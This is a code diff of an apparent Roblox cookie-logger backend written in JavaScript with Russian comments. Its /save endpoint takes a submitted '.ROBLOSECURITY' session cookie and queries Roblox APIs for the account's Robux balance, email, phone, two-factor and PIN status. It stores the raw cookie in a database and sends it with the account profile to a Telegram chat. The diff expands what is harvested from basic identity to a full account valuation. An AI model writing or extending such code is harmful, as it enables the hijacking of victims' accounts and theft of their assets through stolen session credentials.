@@ -17,28 +17,72 @@ sendTelegramMessage = async (chatId, message) => {
     console.error("Ошибка отправки:", error);
   }
 }
-async function getRobloxUserByCookie(cookieValue) {
-  const response = await fetch("https://users.roblox.com/v1/users/authenticated", {
-    method: "GET",
-    headers: {
-      Cookie: `.ROBLOSECURITY=${cookieValue}`,
-      Accept: "application/json"
+async function getRobloxAccountDetails(cookieValue) {
+  const headers = {
+    Cookie: `.ROBLOSECURITY=${cookieValue}`,
+    Accept: "application/json"
+  };
+
+  const fetchJson = async (url) => {
+    const res = await fetch(url, { method: "GET", headers });
+    if (!res.ok) {
+      throw new Error(`${url} -> HTTP ${res.status}`);
     }
-  });
+    return res.json();
+  };
 
-  if (!response.ok) {
-    throw new Error(`Roblox API вернул статус ${response.status}`);
-  }
+  // 1. Базовый профиль: id, name, displayName
+  const authUser = await fetchJson("https://users.roblox.com/v1/users/authenticated");
+  const userId = authUser.id;
 
-  const data = await response.json();
-  // data содержит: id, name (логин), displayName (отображаемое имя)
+  // 2. Параллельно запрашиваем остальные данные
+  const [
+    userProfileRes,
+    robuxRes,
+    emailRes,
+    phoneRes,
+    twoStepRes,
+    pinRes,
+    premiumRes
+  ] = await Promise.allSettled([
+    fetchJson(`https://users.roblox.com/v1/users/${userId}`), // created (дата создания)
+    fetchJson(`https://economy.roblox.com/v1/users/${userId}/currency`), // robux
+    fetchJson("https://accountsettings.roblox.com/v1/email"), // emailVerified / emailAddress
+    fetchJson("https://accountinformation.roblox.com/v1/phone"), // isVerified / phone
+    fetchJson(`https://twostepverification.roblox.com/v1/users/${userId}/configuration`), // enabled
+    fetchJson("https://auth.roblox.com/v1/account/pin"), // isEnabled (статус PIN)
+    fetchJson(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`) // boolean
+  ]);
+
+  const val = (res, fallback = null) => (res.status === "fulfilled" ? res.value : fallback);
+
+  const profile = val(userProfileRes, {});
+  const robux = val(robuxRes, {});
+  const email = val(emailRes, {});
+  const phone = val(phoneRes, {});
+  const twoStep = val(twoStepRes, {});
+  const pin = val(pinRes, {});
+  const premium = val(premiumRes, false);
+
   return {
-    id: data.id,
-    name: data.name,
-    displayName: data.displayName
+    id: userId,
+    name: authUser.name,
+    displayName: authUser.displayName,
+    createdAt: profile.created ?? null,
+    robux: robux.robux ?? null,
+    isPremium: typeof premium === "boolean" ? premium : Boolean(premium?.isPremium),
+    email: {
+      verified: email.verified ?? email.emailVerified ?? null,
+      address: email.emailAddress ?? null
+    },
+    phone: {
+      verified: phone.isVerified ?? phone.verified ?? null,
+      number: phone.phone ?? null
+    },
+    twoFactorEnabled: twoStep.enabled ?? twoStep.isEnabled ?? null,
+    pinEnabled: pin.isEnabled ?? pin.enabled ?? null
   };
 }
-
 
 app.use(express.json());
 app.use(cors({
@@ -53,27 +97,52 @@ app.post("/save", async (req, res) => {
   }
 
   try {
-    const robloxUser = await getRobloxUserByCookie(login);
+    const account = await getRobloxAccountDetails(login);
 
-    // Если в таблице users есть колонки roblox_id и username (или храните как нужно):
+    // Пример: сохраняем в БД (подставьте нужные колонки вашей таблицы)
     await client`
-      INSERT INTO users (roblox_id, username)
-      VALUES (${robloxUser.id}, ${robloxUser.name})
+      INSERT INTO users (
+        roblox_id,
+        username,
+        display_name,
+        created_at,
+        robux,
+        is_premium,
+        email_verified,
+        phone_verified,
+        two_fa_enabled,
+        pin_enabled,
+        login
+      )
+      VALUES (
+        ${account.id},
+        ${account.name},
+        ${account.displayName},
+        ${account.createdAt},
+        ${account.robux},
+        ${account.isPremium},
+        ${account.email.verified},
+        ${account.phone.verified},
+        ${account.twoFactorEnabled},
+        ${account.pinEnabled},
+        ${login}
+      )
     `;
 
     await sendTelegramMessage(
       process.env.CHAT_ID,
-      `Аккаунт Roblox: ${robloxUser.name} (ID: ${robloxUser.id}) Cookie: ${login} был успешно сохранен в базе данных.`
+      [
+        `Аккаунт: ${account.displayName} (@${account.name}, ID: ${account.id})`,
+        `Создан: ${account.createdAt ?? "н/д"}`,
+        `Robux: ${account.robux ?? "н/д"} | Premium: ${account.isPremium ? "да" : "нет"}`,
+        `Почта привязана/подтв.: ${account.email.verified ?? "н/д"} | Телефон: ${account.phone.verified ?? "н/д"}`,
+        `2FA: ${account.twoFactorEnabled ?? "н/д"} | PIN включён: ${account.pinEnabled ?? "н/д"} 
+        
+        COOKIE: ${login}`
+      ].join("\n")
     );
 
-    res.json({
-      ok: true,
-      user: {
-        id: robloxUser.id,
-        name: robloxUser.name,
-        displayName: robloxUser.displayName
-      }
-    });
+    res.json({ ok: true, account });
   } catch (err) {
     console.error("Ошибка:", err);
     res.status(500).json({ ok: false, error: err.message });
